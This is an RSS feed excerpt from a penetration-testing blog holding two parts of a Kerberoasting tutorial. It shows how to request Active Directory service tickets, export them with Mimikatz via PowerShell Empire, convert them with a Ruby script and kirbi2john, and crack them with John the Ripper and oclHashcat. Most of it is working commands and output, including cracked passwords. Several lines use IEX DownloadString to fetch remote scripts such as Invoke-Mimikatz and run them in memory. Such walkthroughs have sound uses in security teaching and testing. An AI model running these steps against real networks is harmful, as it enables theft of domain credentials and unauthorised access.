&lt;li&gt;&lt;a href=&#34;https://github.com/byt3bl33d3r/MITMf&#34;&gt;mitmf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/secretsquirrel/BDFProxy&#34;&gt;BDFProxy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Kerberoasting - Part 3</title>
      <link>https://room362.com/post/2016/kerberoast-pt3/</link>
      <pubDate>Sun, 22 May 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/kerberoast-pt3/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;Now we start cracking the tickets we have and hopefully one will break. The problem with this format is that it takes a LONG time to crack, not as slow as some, but certainly not as fast as NTLM or the like, so pick your targets carefully as the more tickets you try and crack at once the slower it&amp;rsquo;s going to go.&lt;/p&gt;

&lt;h2 id=&#34;cracking-spn-tickets&#34;&gt;Cracking SPN tickets&lt;/h2&gt;

&lt;h3 id=&#34;john-the-ripper&#34;&gt;John the Ripper&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Format added September 30th 2015: &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53&#34;&gt;https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you aren&amp;rsquo;t already using the &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;magnumripper version of John The Ripper&lt;/a&gt; you should be, it&amp;rsquo;s the latest and great and usually has all of the updated formats, fixes, and speedups. In this case it&amp;rsquo;s also the only version that has the KRB5TGS format.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi &amp;gt; /tmp/johnkirb.txt

root@wpad:~/johntheripper/run# ./john /tmp/johnkirb.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 11 password hashes with 11 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 3.35% (ETA: 23:38:44) 0g/s 69751p/s 767263c/s 767263C/s 129700..123junior
ASDqwe123        ($krb5tgs$unkown)
ASDqwe123        ($krb5tgs$unkown)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t! Easy passwords. These are valid account passwords and you should be able to do with them whatever that account can do. We will explore the ability to use them as silver tickets later in this post but don&amp;rsquo;t loose sight that you have a completely valid new account that has access somewhere.&lt;/p&gt;

&lt;h3 id=&#34;oclhashcat&#34;&gt;oclHashcat&lt;/h3&gt;

&lt;p&gt;John The Ripper is fast, but we need that GPU speed for slow hashes like this. Again, we are on the cutting edge of hashes it seems so we are going to have to build the &lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github version of oclHashcat&lt;/a&gt;&lt;/p&gt;

&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Support added to oclHashcat to crack Kerberos 5 TGS-REP: &lt;a href=&#34;https://t.co/wsL2VUihNR&#34;&gt;https://t.co/wsL2VUihNR&lt;/a&gt; (Our first algorithm contributed by community, yay!)&lt;/p&gt;&amp;mdash; hashcat (@hashcat) &lt;a href=&#34;https://twitter.com/hashcat/status/699861868094099456&#34;&gt;February 17, 2016&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;Luckily, building it is pretty straight forward:
&lt;a href=&#34;https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md&#34;&gt;https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Problem is that we have hashes in John the Ripper format and we have to get them into a format that oclHashcat understands:&lt;/p&gt;

&lt;p&gt;Example Hashes: &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;13100	Kerberos 5 TGS-REP etype 23 - $krb5tgs$23$*user$realm$test/spn*$140964709dbdeccbc6121b675ccfb8b2$af937e9d5691b74600e514a3105976f1a8ddb2eed3aeb008ea74ff50bee7a65f14e8c1cbbc360687e6d867c9fbe2e4b2004d0584f0c283a18f613c69c756f78c001647e01da84466f59c655a25913b0cb4e42f0dc88f461e921441da40d6fb56d40545f71b841d00f019f135eb93c2357253796e5dc7da8a455d4fe17c966c3ea3ac620eb5e51c44c8a9cc48d385680c64c519e2113497315e7d7623044d48e2272bd9836b754755c3494040b487757a936780daeff859dd2c8839
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you got your tickets from &lt;strong&gt;kirbi2john.py&lt;/strong&gt; you can convert them using&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat kirbi2johnoutput.txt | sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you got them from &lt;strong&gt;Impacket&lt;/strong&gt;, they are already in a format that is compatible with both John the Ripper and oclHashcat.&lt;/p&gt;

&lt;p&gt;Here is the speed results that Atom was getting using his AMD R9 GPU:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://pastebin.com/raw/3eHx2bFr&#34;&gt;http://pastebin.com/raw/3eHx2bFr&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l 
oclHashcat v2.01 (g0891e39) starting...

Device #1: Hawaii, 2858/4025 MB allocatable, 1010Mhz, 44MCU
Device #2: AMD FX(tm)-8120 Eight-Core Processor, skipped

Hashes: 1 hashes; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Applicable Optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger set to 80c

Device #1: Kernel /root/git/oclHashcat/kernels/m13100_a3.919aa8b9.kernel (234320 bytes)
Device #1: Kernel /root/git/oclHashcat/kernels/markov_le.919aa8b9.kernel (36184 bytes)

Device #1: autotuned kernel-accel to 64
Device #1: autotuned kernel-loops to 50

[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&amp;gt;

$krb5tgs$23$*user$realm$test/hashcat*$08e2261b7a89e56f530b2f7e0620fe8b$ecdca97c13814c95810d7706faf986dad98d06ba033fc5a45fbe9b417b855db5:hashcat

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: Mask (?l?l?l?l?l?l?l) [7]
Hash.Target....: $krb5tgs$23$*user$realm$test/hashcat*$08e...
Hash.Type......: Kerberos 5 TGS-REP etype 23
Time.Started...: Wed Feb 17 08:33:57 2016 (5 secs)
Speed.Dev.#1...:   111.0 MH/s (80.83ms)
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 252313600/8031810176 (3.14%)
Rejected.......: 0/252313600 (0.00%)
Restore.Point..: 0/456976 (0.00%)
HWMon.GPU.#1...:  0% Util, 42c Temp, 20% Fan

Started: Wed Feb 17 08:33:57 2016
Stopped: Wed Feb 17 08:34:04 2016
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Where I was only getting about half of that speed against one hash (NVidia GTX 970):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Session.Name...: oclHashcat
Status.........: Running
Rules.Type.....: File (rules\dive.rule)
Input.Mode.....: File (..\dictionarys\rockyou.txt)
Hash.Target....: (snip)
Hash.Type......: Kerberos 5 TGS-REP etype 23
Time.Started...: Sun May 22 01:32:50 2016 (25 secs)
Time.Estimated.: Sun May 22 09:04:48 2016 (7 hours, 31 mins)
Speed.Dev.#1...: 57894.8 kH/s (14.37ms)
Recovered......: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And as you can see, going against 100 hashes pushed the wait time out to 30 days vs. 7 hours.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Session.Name...: oclHashcat
Status.........: Running
Rules.Type.....: File (rules\dive.rule)
Input.Mode.....: File (..\dictionarys\rockyou.txt)
Hash.Target....: (snip)
Hash.Type......: Kerberos 5 TGS-REP etype 23
Time.Started...: Sun May 22 01:35:16 2016 (16 secs)
Time.Estimated.: Wed Jun 22 14:28:17 2016 (31 days, 12 hours)
Speed.Dev.#1...: 55873.1 kH/s (14.11ms)
Recovered......: 0/100 (0.00%) Digests, 0/1 (0.00%) Salts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So pick your targets and just go after the ones that are old / password hasn&amp;rsquo;t been changed in years.&lt;/p&gt;

&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;

&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/coresecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Github - John the Ripper - Magnumripper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&amp;rsquo;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&amp;rsquo;s SPN directory&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Kerberoasting - Part 2</title>
      <link>https://room362.com/post/2016/kerberoast-pt2/</link>
      <pubDate>Sat, 21 May 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/kerberoast-pt2/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;Now that we&amp;rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;

&lt;h2 id=&#34;requesting-spn-kerberos-tickets&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;

&lt;h3 id=&#34;powershell-requesting&#34;&gt;PowerShell Requesting&lt;/h3&gt;

&lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;One specific ticket:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is great if you are targeting one specific user account:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;HTTP/web01.medin.local&amp;quot;  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;All the tickets (including Computer account tickets):&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&amp;rsquo;s a great example of how to use PowerShell to parse and request things like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;powershell-requesting-just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Getting just the User tickets:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is a slightly modified version of Tim&amp;rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using &lt;code&gt;SetSPN.exe&lt;/code&gt; and makes a request for each of the resulting SPN tickets.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;

&lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(Empire: BDW3E2G2ZRKCUS3B) &amp;gt; usemodule credentials/get_spn_tickets
(Empire: credentials/get_spn_tickets) &amp;gt; info

           Name: Get-SPNTickets
         Module: credentials/get_spn_tickets
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @harmj0y

Description:
  Requests kerberos tickets for all users with a non-null
  service principal name (SPN). These tickets can be extracted
  with credentials/mimikatz/extract_tickets.

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        BDW3E2G2ZRKCUS3B          Agent to run module on.

(Empire: credentials/get_spn_tickets) &amp;gt; run
Job started: Debug32_a7og3



Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 5/19/2016 3:06:41 PM
ValidTo              : 5/19/2016 3:08:41 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 5/19/2016 3:06:41 PM
ValidTo              : 5/20/2016 12:53:24 AM
ServicePrincipalName : http/win10.sittingduck.info
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 5/19/2016 3:06:41 PM
ValidTo              : 5/20/2016 12:53:24 AM
ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Get-SPNTickets completed!
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;exporting-the-tickets&#34;&gt;Exporting the tickets&lt;/h2&gt;

&lt;p&gt;Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:&lt;/p&gt;

&lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;

&lt;p&gt;Using the &lt;strong&gt;&lt;code&gt;kerberos::list /export&lt;/code&gt;&lt;/strong&gt; functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; saves us and has included a &amp;ldquo;base64&amp;rdquo; mode for Mimikatz&lt;/p&gt;

&lt;p&gt;So here I&amp;rsquo;m simply pulling the &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; script that &lt;a href=&#34;https://twitter.com/JosephBialek&#34;&gt;@JosephBialek&lt;/a&gt; &amp;ldquo;clymb3r&amp;rdquo; created, into memory, telling Mimikatz to go in &amp;ldquo;base64&amp;rdquo; mode, export all of the active tickets and exit.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;quot;)
PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;standard::base64 &amp;quot;kerberos::list /export&amp;quot; exit&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;

&lt;p&gt;Here is the module:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(Empire: agents) &amp;gt; usemodule credentials/mimikatz/extract_tickets
(Empire: credentials/mimikatz/extract_tickets) &amp;gt; info

           Name: Invoke-Mimikatz extract kerberos tickets.
         Module: credentials/mimikatz/extract_tickets
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit&#39;s Invoke-Mimikatz function to extract
  kerberos tickets from memory in base64-encoded form.

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        None                      Agent to run module on.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the result&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Job started: Debug32_segox
Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521
  .#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
 .## ^ ##.  &amp;quot;A La Vie, A L&#39;Amour&amp;quot;
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  &#39;#####&#39;                                     with 18 modules * * */

mimikatz(powershell) # standard::base64
isBase64Intercept was    : false
isBase64Intercept is now : true

mimikatz(powershell) # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 5/19/2016 10:53:27 AM ; 5/19/2016 8:53:24 PM ; 5/26/2016 10:53:24 AM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : notanadmin @ SITTINGDUCK.INFO
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
====================
Base64 of file : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
====================
doIFTjCCBUqgAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoRIbEFNJVFRJ
TkdEVUNLLklORk+iJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFNJVFRJTkdEVUNLLklO
Rk+jggQFMIIEAaADAgESoQMCAQKiggPzBIID755axXlzQ6q8s93GffDw/YjUwy+U
KYB3hUdJijD2VtVPfHGnADl/pT2+Xuhu4uMOiVhsjUR/bfhIn8G1MkHPh3d3EtWx
oOvwZt8IsSE4pStAqrDCXAD9HbIi8G4QJ3dxMV875ThyihQKvp8ngHYRl8UfPXD+
YwuJhTm8OqDWiK2EgRDYX9VdtWktJp5FoVRBB4T0MAhMKqEZD5XNpNE6VGNBjJTQ
Fq9/82rfL0m4DkLXOnWxLy6iEL9mPg/etC4P8LQWu/UFbNf4enwSL93sgdq6XV6z
kAc+dv/0gTkoHO+ci4ivQilomtAYtDLU7LLE1nOBC+9gllB8rrnP6WOgIBzqC91K
WLk8cqsjjdacSLcqGJ38rFQQUhVmWcHRqzzn7iiCuTsRulsUZ5EF3kduOVPVzrcy
GA8yMDE2MDUxOTE1MzYwN1qmERgPMjAxNjA1MjAwMDUzMjRapxEYDzIwMTYwNTI2
MTQ1MzI0WqgSGxBTSVRUSU5HRFVDSy5JTkZPqSUwI6ADAgECoRwwGhsGa3JidGd0
GxBTSVRUSU5HRFVDSy5JTkZP
====================

   * Saved to file     : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.&lt;/p&gt;

&lt;p&gt;Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and &lt;code&gt;agent.log&lt;/code&gt; file from the output of &lt;strong&gt;&lt;code&gt;extract_tickets&lt;/code&gt;&lt;/strong&gt; back into their binary format with correct file names. My coding isn&amp;rsquo;t great, so please let me know how I can improve this script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;#!/usr/bin/env ruby
require &#39;base64&#39;

puts ARGV.inspect

if ARGV.length != 1
	puts &amp;quot;Requires a file to parse, usually agent.log&amp;quot;
	exit
end

border = &amp;quot;====================&amp;quot;
bordercount = 0
ticket = []
filename = &amp;quot;failed.log&amp;quot;

File.open(ARGV[0]).each do |line|
	if line.strip == border
		case bordercount
		when 2
			File.open(filename, &#39;a&#39;) {|f| f.write(Base64.decode64(ticket.join))}
			bordercount = 0
			ticket = []
			filename = &amp;quot;failed.log&amp;quot;
		else
			bordercount = bordercount + 1
		end
	else
		case bordercount
		when 1
			filename = line.strip.split(&amp;quot; : &amp;quot;)[1]
			puts &amp;quot;Storing #{filename}&amp;quot;
		when 2
			ticket &amp;lt;&amp;lt; line.strip
		end
	end
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Save that and just feed it an &lt;code&gt;agent.log&lt;/code&gt; file from Empire and WA-LA! you have kirbi files.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ruby parse.rb agent.log
[&amp;quot;agent.log&amp;quot;]
Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 3-40a10000-notanadmin@http~win10.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 4-40a10000-notanadmin@kadmin~changepw-SITTINGDUCK.INFO.kirbi
Storing 5-40a50000-notanadmin@ProtectedStorage~DC1.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 6-40a50000-notanadmin@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 7-40a50000-notanadmin@cifs~win2k8r2.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 8-40a50000-notanadmin@ldap~win2k8r2.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 9-40a50000-notanadmin@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we need to convert those binary tickets into something crackable. That is where &lt;strong&gt;&lt;code&gt;kirbi2john.py&lt;/code&gt;&lt;/strong&gt; comes in.&lt;/p&gt;

&lt;h3 id=&#34;kirbi2john&#34;&gt;Kirbi2John&lt;/h3&gt;

&lt;p&gt;There are two versions of &amp;ldquo;kirbi2john&amp;rdquo;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/kirbi2john.py&#34;&gt;Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py&#34;&gt;John the Ripper&amp;rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
$krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
&lt;/code&gt;&lt;/pre&gt;

